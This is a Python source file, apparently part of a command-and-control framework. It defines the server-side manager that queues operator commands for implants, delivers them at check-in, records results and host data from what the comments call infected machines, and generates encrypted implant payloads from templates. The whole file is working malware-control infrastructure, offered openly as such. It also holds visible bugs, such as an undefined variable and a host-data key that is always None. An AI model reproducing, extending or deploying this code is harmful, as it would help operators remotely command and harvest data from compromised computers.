import ast

from Implant.ImplantGenerator import ImplantGenerator
from Implant.ImplantFunctionality import ImplantFunctionality

from Data.Database import Database


class ImplantSingleton:
    class __OnlyOne:
        ImpFunc = ImplantFunctionality()
        ImpGen = ImplantGenerator()
        # -- The Implant class is sole class responsible for controlling data to and from implants.
        # --    it manages  these interaction across all types of implants and communication protocols.

        def add_implant_command_to_server(self, user, cid, unique_implant_key, command):
            # AddCommand is responsible for creating new entries for implants to pickup.
            #   User validation checks must occur before a command is registered.
            db.implant.Register_ImplantCommand(user, unique_implant_key, command, cid=cid)

        def issue_command(self, UIK=0, c2_protocol=None):
            if UIK != 0:
                # -- Issue command based on unique implant identifiers (UIK)
                # -- UIK is embedded into the implant via Jinja on delivery.

                # TODO:
                # BUG: If the X-Header is mangled this errors.
                ImplantObj = db.implant.Get_GeneratedImplantDataFromUIK(UIK)
                if ImplantObj is None:
                    return None
                db.implant.Update_ImplantLastCheckIn(ImplantObj['cid'], UIK, c2_protocol)

                for implant in ImplantObj:
                    ImpLogs = db.implant.Get_RegisteredImplantCommandsFromUIK(ImplantObj['unique_implant_id'])
                    tmpImpLogs = []
                    for x in ImpLogs:
                        if x.read_by_implant == 0:
                            tmpImpLogs.append(x)
                    if len(tmpImpLogs) != 0:
                        # Get the lowest value (unix epoch where [registered] time is not 0
                        Entry = min(tmpImpLogs, key=lambda x: x.time)
                        # Use the Entry data to generate the implant core string
                        implant_core_string = self.ImpFunc.create_module_data_string(Entry)
                        if db.implant.Register_ImplantCommandPickup(Entry, c2_protocol):
                            return implant_core_string

            # -- Create a suitable null response.
            # --    This may be a random value, depending on how the implant handles it.

                return None
            else:
                return None

        # -- Used by Implant - Logs command responses from infected machines.
        def command_response(self, command_id, raw_command_result, c2_protocol=None):
            unique_implant_key = None
            command_result, host_data = self.ImpFunc.process_command_response(command_id, raw_command_result)

            # -- End command response processing.
            db.implant.Register_ImplantResponse(command_id, command_result, c2_protocol)

            # Once we have updates the command response we will then update the information stored within the
            # unique implant key data.
            # This data will show things like username etc.
            if host_data is not None:
                db.implant.update_host_data(unique_implant_key, host_data)

        # -- Used by webapp.
        def Get_CommandResult(self, cid):
            # -- This trust any calls have already been authenticated/
            # --    May need to move authentication to this level.
            return db.implant.Get_CampaignImplantResponses(cid)

        # -- Used by Implant stagers to create a suitable implant based on implant template configuration
        def GeneratePayload(self, NewSplicedImplantData):
            # -- Refactor code: variable names + checks on types.

            if len(NewSplicedImplantData) == 1:
                NewSplicedImplantData = NewSplicedImplantData[0]
            encrypted_implant, cleartext_implant = self.ImpGen.generate_implant_from_template(NewSplicedImplantData)
            db.implant.Set_GeneratedImplantCopy(NewSplicedImplantData, encrypted_implant, cleartext_implant)
            return encrypted_implant

        # TODO:
        # create functions for all listener/webapp/stager actions to avoid direct DB
        # queries from ImplantManager, HttpListener/HttpsListener etc

        # Register implant submit stager key ( implant template returns a unique implant id aka unique implant key )
        # Implant check in: UII/UIK + protocol checkin occured over

    instance = None

    def __init__(self):
        if not ImplantSingleton.instance:
            ImplantSingleton.instance = ImplantSingleton.__OnlyOne()
        else:
            ImplantSingleton.instance.val = arg


db = Database()
ImplantSingleton()  # Create Singleton
